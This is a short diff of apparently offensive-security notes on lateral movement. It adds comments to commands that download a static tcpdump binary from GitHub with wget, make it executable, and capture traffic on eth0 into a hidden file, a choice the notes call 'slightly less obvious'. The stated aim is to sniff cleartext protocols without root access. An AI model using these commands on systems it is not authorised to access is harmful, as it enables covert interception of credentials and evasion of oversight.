@@ -1,6 +1,12 @@
-#5 - move laterally inside systems
-#packet captures can provide val inf
-#linux - no tcpdump?
+####5 - move laterally inside systems####
+
+=======================================================================
+##packet captures can provide val inf##
+#look for clear protocols
+
+#linux - no tcpdump or su access? statically compiled version can be downloaded if internet access
+#will run on any distro, dependencies are included in the binary
 wget -q https://raw.githubusercontent.com/yunchih/static-binaries/master/tcpdump -O tcpdump && chmod +x tcpdump
 ./tcpdump -D
 ./tcpdump -n -i eth0 -s 0 -w .packets.pcap #. - hidden file, slightly less obvious
+=======================================================================
